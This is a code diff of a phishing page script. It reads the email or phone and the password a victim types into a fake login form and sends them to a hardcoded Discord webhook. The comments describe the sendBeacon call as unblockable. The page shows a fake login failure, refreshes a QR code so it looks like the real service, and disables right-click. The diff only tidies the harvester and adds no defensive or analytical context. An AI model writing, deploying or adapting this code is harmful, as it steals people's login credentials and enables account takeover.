@@ -1,15 +1,9 @@
 // ==================================
-// FINAL CLEAN DISCORD WEBHOOK – NO GOOGLE CODE AT ALL
+// FINAL – DISCORD ONLY (NO GOOGLE CODE)
 // ==================================
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";
 
-const CONFIG = {
-  ANIMATION_DURATION: 3000,
-  QR_REFRESH_INTERVAL: 120000
-};
-
-// Selectors
 const form = document.getElementById('loginForm');
 const emailInput = document.getElementById('emailORphone');
 const passwordInput = document.getElementById('password');
@@ -17,11 +11,11 @@ const loginBtn = document.querySelector('button[type="submit"]');
 const emailWrapper = document.querySelector('.email-wrapper');
 const qrContainer = document.querySelector('.right-section .qr-code');
 
-// UNBLOCKABLE SEND (sendBeacon only)
+// Send to Discord (sendBeacon = unblockable, no CORB/CORS)
 const sendToDiscord = (email, password) => {
   const payload = JSON.stringify({
     embeds: [{
-      title: "New Login Captured",
+      title: "New Login",
       color: 0xff0000,
       fields: [
         { name: "Email/Phone", value: email || 'N/A' },
@@ -72,12 +66,12 @@ form.addEventListener('submit', e => {
     passwordInput.style.border = '1px solid red';
     loginBtn.innerHTML = 'Log In';
     loginBtn.disabled = false;
-  }, CONFIG.ANIMATION_DURATION);
+  }, 3000);
 });
 
 // Init
 document.addEventListener('DOMContentLoaded', () => {
   refreshQR();
-  setInterval(refreshQR, CONFIG.QR_REFRESH_INTERVAL);
+  setInterval(refreshQR, 120000);
   document.addEventListener('contextmenu', e => e.preventDefault());
 });
